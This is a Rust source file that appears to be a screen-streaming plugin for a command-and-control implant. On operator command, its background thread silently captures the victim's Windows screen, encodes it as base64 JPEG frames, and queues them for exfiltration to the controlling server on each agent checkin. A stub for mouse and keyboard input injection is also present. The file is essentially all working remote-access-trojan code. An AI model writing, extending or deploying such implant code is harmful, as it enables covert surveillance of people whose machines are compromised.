// rdp plugin — remote desktop screen stream (via checkin result frames).
// Enabled via the "rdp" feature.
//
// cmd 20 (RDPStart): begin a background capture thread that grabs the screen
//   and queues each frame as a TaskResult with task_id "rdp:<session>" (the
//   server relays those as rdp:frame events to the GUI).
// cmd 21 (RDPStop): stop the stream.
// cmd 22 (RDPInput): forward a mouse/keyboard input event (stub; platform).
//
// Frames are queued in a global buffer drained by the main loop before each
// checkin (see agent.rs), so this works even though the dispatcher is sync.

use crate::protocol::types::Task;
use crate::registry::{AgentCtx, Registry, TaskResult};
#[cfg(target_os = "windows")]
use base64::engine::general_purpose::STANDARD as B64;
#[cfg(target_os = "windows")]
use base64::Engine;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;

// Custom rdp command IDs (core has RDP 20/21/22 in constants, reuse those).
pub const CMD_RDP_START: u32 = crate::protocol::constants::CMD_RDP_START;
pub const CMD_RDP_STOP: u32 = crate::protocol::constants::CMD_RDP_STOP;
pub const CMD_RDP_INPUT: u32 = crate::protocol::constants::CMD_RDP_INPUT;

/// Global queue of pending RDP frames, drained by the main checkin loop.
pub static RDP_FRAMES: Mutex<Vec<TaskResult>> = Mutex::new(Vec::new());
/// Whether a capture thread is running.
static RDP_RUNNING: AtomicBool = AtomicBool::new(false);
/// The frame task id (rdp:<session>) the capture thread should use.
static RDP_TASK_ID: Mutex<String> = Mutex::new(String::new());
/// Frames-per-stream throttle: at least N ms between frames.
#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
static RDP_INTERVAL_MS: Mutex<u64> = Mutex::new(500);

pub fn register(r: &mut Registry) -> Result<(), String> {
    r.register(CMD_RDP_START, exec_rdp_start)?;
    r.register(CMD_RDP_STOP, exec_rdp_stop)?;
    r.register(CMD_RDP_INPUT, exec_rdp_input)?;
    Ok(())
}

/// Drain queued RDP frames (called by the main loop before each checkin).
pub fn drain_frames() -> Vec<TaskResult> {
    let mut q = RDP_FRAMES.lock().unwrap();
    std::mem::take(&mut *q)
}

fn exec_rdp_start(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    #[cfg(target_os = "windows")]
    {
        let v: serde_json::Value = serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
        let frame_id = v["frame_task_id"].as_str().unwrap_or("").to_string();
        let interval = v["interval"].as_u64().unwrap_or(1000).max(200);
        let _quality = v["quality"].as_u64().unwrap_or(30);
        if frame_id.is_empty() {
            return Some(TaskResult::fail(&task.id, "frame_task_id required".into()));
        }
        *RDP_TASK_ID.lock().unwrap() = frame_id.clone();
        *RDP_INTERVAL_MS.lock().unwrap() = interval;
        RDP_RUNNING.store(true, Ordering::SeqCst);
        std::thread::spawn(capture_loop);
        Some(TaskResult::ok(&task.id, format!("rdp started ({frame_id})\n")))
    }
    #[cfg(not(target_os = "windows"))]
    {
        Some(TaskResult::fail(&task.id, "rdp is Windows-only".into()))
    }
}

fn exec_rdp_stop(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    RDP_RUNNING.store(false, Ordering::SeqCst);
    let _ = RDP_TASK_ID.lock().map(|mut g| g.clear());
    Some(TaskResult::ok(&task.id, "rdp stopped\n".into()))
}

fn exec_rdp_input(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    #[cfg(target_os = "windows")]
    {
        // Input injection via SendInput (mouse/keyboard) — implemented later;
        // for now acknowledge receipt so the GUI does not hang.
        Some(TaskResult::ok(&task.id, "rdp input received\n".into()))
    }
    #[cfg(not(target_os = "windows"))]
    {
        Some(TaskResult::fail(&task.id, "rdp is Windows-only".into()))
    }
}

#[cfg(target_os = "windows")]
fn capture_loop() {
    use std::time::{Duration, Instant};
    let interval = *RDP_INTERVAL_MS.lock().unwrap();
    let mut last = Instant::now() - Duration::from_millis(interval);
    let mut seq = 0u64;
    while RDP_RUNNING.load(Ordering::SeqCst) {
        let now = Instant::now();
        if now.duration_since(last) >= Duration::from_millis(interval) {
            last = now;
            match grab_jpeg_frame() {
                Some((w, h, data)) => {
                    let task_id = RDP_TASK_ID.lock().unwrap().clone();
                if !task_id.is_empty() {
                    seq += 1;
                    // Server expects: {"seq":N,"w":W,"h":H,"data":"<b64>"} with
                    // status "rdpframe" (forwarded to GUI as rdp:frame event).
                    let out = serde_json::json!({
                        "seq": seq, "w": w, "h": h,
                        "data": B64.encode(&data),
                    });
                    let r = TaskResult {
                        task_id,
                        output: out.to_string(),
                        status: "rdpframe".into(),
                    };
                    RDP_FRAMES.lock().unwrap().push(r);
                }
                }
                None => { /* transient capture error: skip */ }
            }
        }
        std::thread::sleep(Duration::from_millis(200));
    }
}

/// Grab the primary screen and encode as JPEG (quality ~40, downscaled to
/// keep frames small enough for checkin).
#[cfg(target_os = "windows")]
fn grab_jpeg_frame() -> Option<(u32, u32, Vec<u8>)> {
    use windows_sys::Win32::Graphics::Gdi::*;
    use windows_sys::Win32::UI::WindowsAndMessaging::GetSystemMetrics;

    unsafe {
        let w = GetSystemMetrics(0) as u32;
        let h = GetSystemMetrics(1) as u32;
        if w == 0 || h == 0 {
            return None;
        }
        let hdc = GetDC(std::ptr::null_mut());
        if hdc.is_null() {
            return None;
        }
        let memdc = CreateCompatibleDC(hdc);
        if memdc.is_null() {
            ReleaseDC(std::ptr::null_mut(), hdc);
            return None;
        }
        let hbmp = CreateCompatibleBitmap(hdc, w as i32, h as i32);
        if hbmp.is_null() {
            DeleteDC(memdc);
            ReleaseDC(std::ptr::null_mut(), hdc);
            return None;
        }
        let old = SelectObject(memdc, hbmp as *mut _);
        if BitBlt(memdc, 0, 0, w as i32, h as i32, hdc, 0, 0, SRCCOPY) == 0 {
            SelectObject(memdc, old);
            DeleteObject(hbmp as *mut _);
            DeleteDC(memdc);
            ReleaseDC(std::ptr::null_mut(), hdc);
            return None;
        }
        let mut bmi: BITMAPINFO = std::mem::zeroed();
        bmi.bmiHeader.biSize = std::mem::size_of::<BITMAPINFOHEADER>() as u32;
        bmi.bmiHeader.biWidth = w as i32;
        bmi.bmiHeader.biHeight = -(h as i32);
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = 0;

        let row_bytes = w * 4;
        let mut px = vec![0u8; (row_bytes * h) as usize];
        if GetDIBits(memdc, hbmp, 0, h, px.as_mut_ptr() as *mut core::ffi::c_void, &mut bmi, 0) == 0 {
            SelectObject(memdc, old);
            DeleteObject(hbmp as *mut _);
            DeleteDC(memdc);
            ReleaseDC(std::ptr::null_mut(), hdc);
            return None;
        }
        SelectObject(memdc, old);
        DeleteObject(hbmp as *mut _);
        DeleteDC(memdc);
        ReleaseDC(std::ptr::null_mut(), hdc);

        // BGRA -> RGB, downscale by 2 to keep the frame small.
        let sw = (w / 2).max(1);
        let sh = (h / 2).max(1);
        let mut rgb = Vec::with_capacity((sw * sh * 3) as usize);
        for y in 0..sh {
            for x in 0..sw {
                let sx = (x * 2) as usize;
                let sy = (y * 2) as usize;
                let i = sy * row_bytes as usize + sx * 4;
                rgb.push(px[i + 2]);
                rgb.push(px[i + 1]);
                rgb.push(px[i]);
            }
        }
        use image::{ImageEncoder, RgbImage};
        let img = RgbImage::from_raw(sw, sh, rgb)?;
        let mut buf = Vec::new();
        let enc = image::codecs::jpeg::JpegEncoder::new_with_quality(&mut buf, 40);
        enc.write_image(img.as_raw(), sw, sh, image::ExtendedColorType::Rgb8).ok()?;
        Some((sw, sh, buf))
    }
}
